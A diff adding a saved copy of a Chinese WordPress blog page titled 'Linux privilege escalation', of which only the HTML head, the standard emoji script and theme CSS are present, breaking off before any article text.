@@ -1,0 +1,1225 @@
+<!DOCTYPE html>
+<!-- saved from url=(0035)https://www.why403.cn/archives/1316 -->
+<html lang="zh-Hans" version="4"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://www.why403.cn/xmlrpc.php">
+<title>linux提权 – why403</title>
+<meta name="robots" content="max-image-preview:large">
+<link rel="dns-prefetch" href="https://www.why403.cn/">
+<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
+<link rel="alternate" type="application/rss+xml" title="why403 » Feed" href="https://www.why403.cn/feed">
+<link rel="alternate" type="application/rss+xml" title="why403 » 评论 Feed" href="https://www.why403.cn/comments/feed">
+<link rel="alternate" type="application/rss+xml" title="why403 » linux提权 评论 Feed" href="https://www.why403.cn/archives/1316/feed">
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.why403.cn\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel="stylesheet" id="wp-block-library-css" href="./linux提权 – why403_files/style.min.css" media="all">
+<link rel="stylesheet" id="mpp_gutenberg-css" href="./linux提权 – why403_files/blocks.style.build.css" media="all">
+<style id="classic-theme-styles-inline-css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--accent-1: #E9B44C;--wp--preset--color--accent-2: #0F8B8D;--wp--preset--color--headings: #162521;--wp--preset--color--sitetext: #707070;--wp--preset--color--sitebg: #ffffff;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 10px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 25px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--normal: 16px;--wp--preset--font-size--larger: 40px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel="stylesheet" id="bravada-themefonts-css" href="./linux提权 – why403_files/fontfaces.css" media="all">
+<link rel="stylesheet" id="bravada-googlefonts-css" href="./linux提权 – why403_files/css" media="all">
+<link rel="stylesheet" id="bravada-main-css" href="./linux提权 – why403_files/style.css" media="all">
+<style id="bravada-main-inline-css">
+ body:not(.bravada-landing-page) #container, #colophon-inside, .footer-inside, #breadcrumbs-container-inside { margin: 0 auto; max-width: 1920px; } body:not(.bravada-landing-page) #container { max-width: calc( 1920px - 4em ); } .site-header-inside { max-width: 1920px; margin: 0 auto; } #primary { width: 200px; } #secondary { width: 200px; } #container.one-column .main { width: 100%; } #container.two-columns-right #secondary { float: right; } #container.two-columns-right .main, .two-columns-right #breadcrumbs { width: calc( 100% - 200px ); float: left; } #container.two-columns-left #primary { float: left; } #container.two-columns-left .main, .two-columns-left #breadcrumbs { width: calc( 100% - 200px ); float: right; } #container.three-columns-right #primary, #container.three-columns-left #primary, #container.three-columns-sided #primary { float: left; } #container.three-columns-right #secondary, #container.three-columns-left #secondary, #container.three-columns-sided #secondary { float: left; } #container.three-columns-right #primary, #container.three-columns-left #secondary { margin-left: 0%; margin-right: 0%; } #container.three-columns-right .main, .three-columns-right #breadcrumbs { width: calc( 100% - 400px ); float: left; } #container.three-columns-left .main, .three-columns-left #breadcrumbs { width: calc( 100% - 400px ); float: right; } #container.three-columns-sided #secondary { float: right; } #container.three-columns-sided .main, .three-columns-sided #breadcrumbs { width: calc( 100% - 400px ); float: right; } .three-columns-sided #breadcrumbs { margin: 0 calc( 0% + 200px ) 0 -1920px; } html { font-family: Muli; font-size: 16px; font-weight: 400; line-height: 1.8; ; } #site-title { font-family: Playfair Display; font-size: 1.3em; font-weight: 700; } #site-text { ; } nav#mobile-menu #mobile-nav a { font-family: Playfair Display; font-size: 2.5em; font-weight: 700; font-size: clamp(1.3rem, 5vw, 2.5em); ; } nav#mobile-menu #mobile-nav ul.sub-menu a { font-size: clamp(1.1rem, 4vw, 2em); } nav#mobile-menu input[type=search] { font-family: Playfair Display; } .widget-title, #comments-title, #reply-title, .related-posts .related-main-title, .main .author-info .page-title { font-family: Playfair Display; font-size: 1.2em; font-weight: 700; line-height: 2; margin-bottom: 0.5em; ; } .widget-title::after, #comments-title::after, #reply-title::after, .related-posts .related-main-title::after { margin-bottom: 0.5em; } .widget-container { font-family: Muli; font-size: 1em; font-weight: 400; } .widget-container ul li { line-height: 1.8; ; } .entry-title, .main .page-title { font-family: Playfair Display; font-size: 1.7em; font-weight: 700; ; } body:not(.single) .entry-meta > span { font-family: Muli; font-size: 1em; font-weight: 300; ; } /* single post titles/metas */ #header-page-title .entry-title, .singular-title, .lp-staticslider .staticslider-caption-title, .seriousslider-theme .seriousslider-caption-title { font-family: Playfair Display; font-size: 5em; font-weight: 700; font-size: clamp(2.5em, 5vw, 5em ); line-height: 1.3; ; } .single .entry-meta > span { font-family: Muli; font-size: 1.1em; font-weight: 300; ; } h1 { font-size: 2.33em; } h2 { font-size: 2.06em; } h3 { font-size: 1.79em; } h4 { font-size: 1.52em; } h5 { font-size: 1.25em; } h6 { font-size: 0.98em; } h1, h2, h3, h4 { font-family: Playfair Display; font-weight: 700; ; } .entry-content h1, .entry-summary h1, .entry-content h2, .entry-summary h2, .entry-content h3, .entry-summary h3, .entry-content h4, .entry-summary h4, .entry-content h5, .entry-summary h5, .entry-content h6, .entry-summary h6 { line-height: 1.2; margin-bottom: 0.5em; } .lp-section-header .lp-section-desc, .lp-box-title, .lp-tt-title, #nav-fixed a + a, #nav-below span, .lp-blocks.lp-blocks1 .lp-block .lp-block-readmore { font-family: Playfair Display; } .lp-section-header .lp-section-title { font-family: Muli; } blockquote cite { font-family: Muli; } :root { --bravada-accent-1: #E9B44C; --bravada-accent-2: #0F8B8D; } .bravada-accent-1 { color: #E9B44C; } .bravada-accent-2 { color: #0F8B8D; } .bravada-accent-1-bg { background-color: #E9B44C; } .bravada-accent-2-bg { background-color: #0F8B8D; } body { color: #707070; background-color: #f3f7f6; } .lp-staticslider .staticslider-caption-text a { color: #FFFFFF; } #site-header-main, .menu-search-animated .searchform input[type="search"], #access .menu-search-animated .searchform, .site-header-bottom-fixed, .bravada-over-menu .site-header-bottom.header-fixed .site-header-bottom-fixed { background-color: #FFFFFF; } .bravada-over-menu .site-header-bottom-fixed { background: transparent; } .bravada-over-menu .header-fixed.site-header-bottom #site-title a, .bravada-over-menu .header-fixed.site-header-bottom #site-description { color: #E9B44C; } .bravada-over-menu #site-title a, .bravada-over-menu #site-description, .bravada-over-menu #access > div > ul > li, .bravada-over-menu #access > div > ul > li > a, .bravada-over-menu .site-header-bottom:not(.header-fixed) #nav-toggle, #breadcrumbs-container span, #breadcrumbs-container a, #breadcrumbs-container i { color: #FFFFFF; } #bmobile #site-title a { color: #E9B44C; } #site-title a::before { background: #E9B44C; } body:not(.bravada-over-menu) .site-header-bottom #site-title a::before, .bravada-over-menu .header-fixed.site-header-bottom #site-title a::before { background: #0F8B8D; } body:not(.bravada-over-menu) .site-header-bottom #site-title a:hover { background: #E9B44C; } #site-title a:hover::before { background: #0F8B8D; } #access > div > ul > li, #access > div > ul > li > a, .bravada-over-menu .header-fixed.site-header-bottom #access > div > ul > li:not([class*='current']), .bravada-over-menu .header-fixed.site-header-bottom #access > div > ul > li:not([class*='current']) > a { color: #444444; } .hamburger span { background-color: #444444; } #mobile-menu, nav#mobile-menu #mobile-nav a { color: #FFFFFF; } nav#mobile-menu #mobile-nav > li.current_page_item > a, nav#mobile-menu #mobile-nav > li.current-menu-item > a, nav#mobile-menu #mobile-nav > li.current_page_ancestor > a, nav#mobile-menu #mobile-nav > li.current-menu-ancestor > a, nav#mobile-menu #mobile-nav a:hover { color: #E9B44C; } nav#mobile-menu { color: #FFFFFF; background-color: #066664; } #mobile-nav .searchform input[type="search"] { border-color: #FFFFFF; } .burgermenu-active.bravada-over-menu .site-header-bottom.header-fixed .site-header-bottom-fixed { background-color: transparent; } .burgermenu-active.bravada-over-menu .site-header-bottom .hamburger span { background-color: #FFFFFF; } .bravada-over-menu:not(.burgermenu-active) .site-header-bottom:not(.header-fixed) .hamburger span { background-color: #FFFFFF; } .bravada-over-menu .header-fixed.site-header-bottom .side-section-element.widget_cryout_socials a:hover::before, .side-section-element.widget_cryout_socials a:hover::before { color: #FFFFFF; } #access ul.sub-menu li a, #access ul.children li a, .topmenu ul li a { color: #FFFFFF; } #access ul.sub-menu li a, #access ul.children li a { background-color: #066664; } #access ul.sub-menu li a:hover, #access ul.children li a:hover { color: #E9B44C; } #access > div > ul > li.current_page_item > a, #access > div > ul > li.current-menu-item > a, #access > div > ul > li.current_page_ancestor > a, #access > div > ul > li.current-menu-ancestor > a, .bravada-over-menu .header-fixed.site-header-bottom #access > div > ul > li > a { color: #e9b44c; } #access ul.children > li.current_page_item > a, #access ul.sub-menu > li.current-menu-item > a, #access ul.children > li.current_page_ancestor > a, #access ul.sub-menu > li.current-menu-ancestor > a { opacity: 0.95; } #access > div > ul ul > li a:not(:only-child)::after { border-left-color: #066664; } #access > div > ul > li > ul::before { border-bottom-color: #066664; } #access ul li.special1 > a { background-color: #f0f0f0; } #access ul li.special2 > a { background-color: #444444; color: #FFFFFF; } #access ul li.accent1 > a { background-color: #E9B44C; color: #FFFFFF; } #access ul li.accent2 > a { background-color: #0F8B8D; color: #FFFFFF; } #access ul li.accent1 > a:hover, #access ul li.accent2 > a:hover { color: #FFFFFF; } #access > div > ul > li.accent1 > a > span::before, #access > div > ul > li.accent2 > a > span::before { background-color: #FFFFFF; } article.hentry, body:not(.blog):not(.page-template-template-blog):not(.archive):not(.search) #container:not(.bravada-landing-page) .main, body.bravada-boxed-layout:not(.bravada-landing-page) #container { background-color: #ffffff; } .pagination span { color: #0F8B8D; } .pagination a:hover { background-color: #E9B44C; color: #ffffff; } #header-overlay, .lp-staticslider::after, .seriousslider-theme .item::after { background-color: #08415c; background: -webkit-linear-gradient( 90deg, #08415c 0%, #1c110a 100%); background: linear-gradient( 180deg, #08415c 0%, #1c110a 100%); opacity: 0.6; pointer-events: none; } #header-page-title #header-page-title-inside, #header-page-title .entry-title, #header-page-title .entry-meta span, #header-page-title .entry-meta a, #header-page-title .entry-meta time, #header-page-title .entry-meta .icon-metas::before, #header-page-title .byline, #header-page-title #breadcrumbs-nav, .lp-staticslider .staticslider-caption-inside, .seriousslider-theme .seriousslider-caption-inside { color: #FFFFFF; } #colophon, #footer { background-color: #1e3231; color: #DBDBDB; } .post-thumbnail-container .featured-image-overlay::before { background-color: #E9B44C; background: -webkit-gradient(linear, left top, left bottom, from(#E9B44C), to(#0F8B8D)); background: linear-gradient(to bottom, #E9B44C, #0F8B8D); } .post-thumbnail-container .featured-image-overlay::after { background-color: #E9B44C; background: -webkit-gradient(linear, left top, left bottom, from(#E9B44C), to(#0F8B8D)); background: linear-gradient(to bottom, #0F8B8D, #E9B44C); } .main #content-masonry .post-thumbnail-container:hover + .entry-after-image .entry-title a { color: #E9B44C; } @media (max-width: 720px) { .bravada-magazine-one .main #content-masonry .post-thumbnail-container + .entry-after-image { background-color: #ffffff; } } .entry-title a:active, .entry-title a:hover { color: #E9B44C; } span.entry-format { color: #E9B44C; } .main #content-masonry .format-link .entry-content a { background-color: #E9B44C; color: #ffffff; } .main #content-masonry .format-link::after { color: #ffffff; } .cryout article.hentry.format-image, .cryout article.hentry.format-audio, .cryout article.hentry.format-video { background-color: #ffffff; } .format-aside, .format-quote { border-color: #eeeeee; } .single .author-info { border-color: #eeeeee; } .entry-content h5, .entry-content h6, .lp-text-content h5, .lp-text-content h6 { color: #0F8B8D; } .entry-content blockquote::before, .entry-content blockquote::after { color: rgba(112,112,112,0.2); } .entry-content h1, .entry-content h2, .entry-content h3, .entry-content h4, .lp-text-content h1, .lp-text-content h2, .lp-text-content h3, .lp-text-content h4 { color: #162521; } .entry-title, .page-title { color: #162521; } a { color: #E9B44C; } a:hover, .widget-area a, .entry-meta span a:hover, .comments-link a { color: #0F8B8D; } .comments-link a:hover, .widget-area a:hover { color: #E9B44C; } .socials a::before, .socials a:hover::before { color: #E9B44C; } .socials a::after, .socials a:hover::after { color: #0F8B8D; } .bravada-normalizedtags #content .tagcloud a { color: #ffffff; background-color: #E9B44C; } .bravada-normalizedtags #content .tagcloud a:hover { background-color: #0F8B8D; } #nav-fixed i { background-color: #dbdbdb; } #nav-fixed .nav-next:hover i, #nav-fixed .nav-previous:hover i { background-color: #0F8B8D; } #nav-fixed a:hover + a, #nav-fixed a + a:hover { background-color: rgba(15,139,141,1); } #nav-fixed i, #nav-fixed span { color: #ffffff; } button#toTop i::before { color: #E9B44C; } button#toTop i::after { color: #0F8B8D; } @media (max-width: 800px) { .cryout #footer-bottom .footer-inside { padding-top: 2.5em; } .cryout .footer-inside a#toTop { background-color: #E9B44C; color: #f3f7f6; } .cryout .footer-inside a#toTop:hover { opacity: 0.8;} } .entry-meta .icon-metas:before { color: #b5b5b5; } #site-title span a::before { width: calc(100% - 1.2em); } .bravada-caption-one .main .wp-caption .wp-caption-text { border-bottom-color: #eeeeee; } .bravada-caption-two .main .wp-caption .wp-caption-text { background-color: #f5f5f5; } .bravada-image-one .entry-content img[class*="align"], .bravada-image-one .entry-summary img[class*="align"], .bravada-image-two .entry-content img[class*='align'], .bravada-image-two .entry-summary img[class*='align'] { border-color: #eeeeee; } .bravada-image-five .entry-content img[class*='align'], .bravada-image-five .entry-summary img[class*='align'] { border-color: #E9B44C; } .entry-summary .excerpt-fade { background-image: linear-gradient(to left, #ffffff, transparent); } /* diffs */ span.edit-link a.post-edit-link, span.edit-link a.post-edit-link:hover, span.edit-link .icon-edit:before { color: #707070; } .searchform { border-color: #ebebeb; } .entry-meta span, .entry-meta a, .entry-utility span, .entry-utility a, .entry-meta time, #breadcrumbs-nav { color: #a7a7a7; } .main #content-masonry .post-thumbnail-container span.bl_categ, .main #content-masonry .post-thumbnail-container .comments-link { background-color: #ffffff; } .footermenu ul li span.sep { color: #E9B44C; } .entry-meta a::after, .entry-utility a::after { background: #0F8B8D; } #header-page-title .category-metas a { color: #E9B44C; } .entry-meta .author:hover .avatar { border-color: #E9B44C; } .animated-title span.cry-single.animated-letter, .animated-title span.cry-double.animated-letter { color: #E9B44C; } span.entry-sticky { color: #0F8B8D; } #commentform { } code, #nav-below .nav-previous a::before, #nav-below .nav-next a::before { background-color: #eeeeee; } #nav-below .nav-previous::after, #nav-below .nav-next::after { background-color: #E9B44C; } pre, .comment-author { border-color: #eeeeee; } .commentlist .comment-area, .commentlist .pingback { border-color: #f3f3f3; } .commentlist img.avatar { background-color: #ffffff; } .comment-meta a { color: #bfbfbf; } .commentlist .reply a, .commentlist .author-name, .commentlist .author-name a { background-color: #E9B44C; color: #ffffff; } .commentlist .reply a:hover { background-color: #0F8B8D; } select, input[type], textarea { color: #707070; background-color: #f5f5f5; } .sidey select { background-color: #ffffff; } .searchform .searchsubmit { background: #E9B44C; } .searchform:hover .searchsubmit { background: #0F8B8D; } .searchform input[type="search"], .searchform input[type="search"]:hover, .searchform input[type="search"]:focus { background-color: #ffffff; } input[type]:hover, textarea:hover, select:hover, input[type]:focus, textarea:focus, select:focus { border-color: #dcdcdc; } button, input[type="button"], input[type="submit"], input[type="reset"] { background-color: #E9B44C; color: #ffffff; } button:hover, input[type="button"]:hover, input[type="submit"]:hover, input[type="reset"]:hover { background-color: #0F8B8D; } .comment-form-author input, .comment-form-email input, .comment-form-url input, .comment-form-comment textarea { background-color: #f0f0f0; } .comment-form-author input:hover, .comment-form-email input:hover, .comment-form-url input:hover, .comment-form-comment textarea:hover, .comment-form-author input:focus, .comment-form-email input:focus, .comment-form-url input:focus, .comment-form-comment textarea:focus { background-color: #E9B44C; color: #ffffff; } .comment-form-author, .comment-form-email { border-color: #ffffff; } hr { background-color: #f0f0f0; } .cryout-preloader-inside .bounce1 { background-color: #E9B44C; } .cryout-preloader-inside .bounce2 { background-color: #0F8B8D; } .page-header.pad-container { background-color: #ffffff; } /* gutenberg */ .wp-block-image.alignwide { margin-left: calc( ( 0% + 4em ) * -1 ); margin-right: calc( ( 0% + 4em ) * -1 ); } .wp-block-image.alignwide img { width: calc( 100% + 8em ); max-width: calc( 100% + 8em ); } .has-accent-1-color, .has-accent-1-color:hover { color: #E9B44C; } .has-accent-2-color, .has-accent-2-color:hover { color: #0F8B8D; } .has-headings-color, .has-headings-color:hover { color: #162521; } .has-sitetext-color, .has-sitetext-color:hover { color: #707070; } .has-sitebg-color, .has-sitebg-color:hover { color: #ffffff; } .has-accent-1-background-color { background-color: #E9B44C; } .has-accent-2-background-color { background-color: #0F8B8D; } .has-headings-background-color { background-color: #162521; } .has-sitetext-background-color { background-color: #707070; } .has-sitebg-background-color { background-color: #ffffff; } .has-small-font-size { font-size: 13px; } .has-regular-font-size { font-size: 16px; } .has-large-font-size { font-size: 19px; } .has-larger-font-size { font-size: 23px; } .has-huge-font-size { font-size: 23px; } /* woocommerce */ .woocommerce-thumbnail-container .woocommerce-buttons-container a, .woocommerce-page #respond input#submit.alt, .woocommerce a.button.alt, .woocommerce-page button.button.alt, .woocommerce input.button.alt, .woocommerce #respond input#submit, .woocommerce a.button, .woocommerce button.button, .woocommerce input.button { } .woocommerce ul.products li.product .woocommerce-loop-category__title, .woocommerce ul.products li.product 